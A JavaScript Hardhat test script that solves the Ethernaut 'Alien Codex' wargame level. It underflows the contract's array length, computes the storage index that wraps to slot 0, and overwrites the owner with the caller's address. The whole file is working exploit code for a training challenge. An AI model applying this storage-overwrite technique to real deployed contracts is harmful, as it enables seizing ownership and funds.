// npx hardhat test ./test/19_alien_codex.js --network rinkeby

const { expect } = require("chai");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "AlienCodex";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._19_alien_codex, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    let tx = await levelContract.make_contact();
    await tx.wait();

    tx = await levelContract.retract();
    await tx.wait();

    let codexStart = ethers.BigNumber.from(
        ethers.utils.keccak256(
            `0x0000000000000000000000000000000000000000000000000000000000000001`
        )
    );
    console.log(`codexStart`, codexStart.toHexString());

    let ownerOffset = ethers.BigNumber.from(`2`).pow(`256`).sub(codexStart);
    console.log(`owner`, await ethers.provider.getStorageAt(levelContract.address, ownerOffset));

    const accounts = await ethers.getSigners();
    tx = await levelContract.revise(ownerOffset, ethers.utils.zeroPad(accounts[0].address, 32));
    await tx.wait();
    console.log(`owner`, await ethers.provider.getStorageAt(levelContract.address, ownerOffset));

});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});